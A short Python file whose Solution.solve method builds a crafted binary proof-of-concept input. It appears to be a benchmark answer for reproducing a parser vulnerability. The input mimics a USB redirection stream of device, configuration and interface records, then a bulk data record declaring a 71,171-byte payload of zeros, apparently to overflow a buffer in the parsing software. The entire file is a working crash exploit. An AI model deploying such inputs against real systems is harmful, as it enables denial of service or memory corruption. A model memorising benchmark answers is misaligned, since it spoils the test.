import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b''
        L = 71171
        # Device add
        data_add = struct.pack('<BB', 1, 1)  # bus, addr
        data_add += struct.pack('<H', 3)  # speed high
        data_add += struct.pack('<HH', 0x1234, 0x5678)  # vendor, product
        data_add += struct.pack('<BBB', 0, 0, 0)  # class, sub, prot
        data_add += struct.pack('<B', 1)  # num configs
        for _ in range(5):
            data_add += struct.pack('<B', 0)  # empty strings
        len_add = len(data_add)
        poc += struct.pack('<II', 8 + len_add, 1) + data_add
        # Config
        conf_head = b'\x09\x02\x00\x00\x01\x00\x80\x32'
        total_len = 32
        conf_head = conf_head[:2] + struct.pack('<H', total_len) + conf_head[4:]
        if_desc = b'\x09\x04\x00\x00\x01\x08\x06\x50\x00'
        ep_out = b'\x07\x05\x02\x02' + struct.pack('<H', 512) + b'\x00'
        ep_in = b'\x07\x05\x81\x02' + struct.pack('<H', 512) + b'\x00'
        config_desc = conf_head + if_desc + ep_out + ep_in
        data_conf = struct.pack('<B', 0) + config_desc
        len_conf = len(data_conf)
        poc += struct.pack('<II', 8 + len_conf, 3) + data_conf
        # Interface
        if_data = struct.pack('<BB', 0, 0) + if_desc + ep_out + ep_in
        len_if = len(if_data)
        poc += struct.pack('<II', 8 + len_if, 4) + if_data
        # Packed start
        poc += struct.pack('<II', 16, 8) + struct.pack('<Q', 0)
        # Packed data
        sub_data = struct.pack('<BB', 1, 0x02)  # bulk, ep 0x02
        sub_data += struct.pack('<H', L)
        sub_data += b'\x00' * L
        len_sub = len(sub_data)
        poc += struct.pack('<II', 8 + len_sub, 9) + sub_data
        return poc
